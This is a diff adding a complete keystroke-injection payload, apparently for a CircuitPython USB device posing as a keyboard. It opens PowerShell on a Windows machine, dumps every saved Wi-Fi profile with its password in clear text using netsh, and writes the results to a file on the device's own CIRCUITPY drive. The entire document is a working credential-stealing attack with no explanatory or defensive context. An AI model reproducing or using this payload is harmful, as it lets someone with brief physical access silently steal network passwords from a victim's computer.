@@ -1,0 +1,25 @@
+DELAY 800
+GUI r
+DELAY 400
+STRING powershell
+DELAY 400
+ENTER
+DELAY 3000
+STRING if ($env:OS -notlike "*Windows*") { exit }
+ENTER
+DELAY 500
+STRING $outputFile = (Get-Volume | Where-Object { $_.FileSystemLabel -eq "CIRCUITPY" }).DriveLetter + ":\WiFiPasswords.txt"
+ENTER
+DELAY 500
+STRING Clear-Content -Path $outputFile -ErrorAction SilentlyContinue
+ENTER
+DELAY 500
+STRING $profiles = netsh wlan show profiles
+ENTER
+DELAY 500
+STRING foreach ($profile in $profiles) { if ($profile -match 'All User Profile\s+:\s+(.*)$') { $profileName = $matches[1]; $profileDetails = netsh wlan show profile name="$profileName" key=clear | Out-String; "$profileName : $profileDetails" | Out-File -Append -FilePath $outputFile } }
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 500
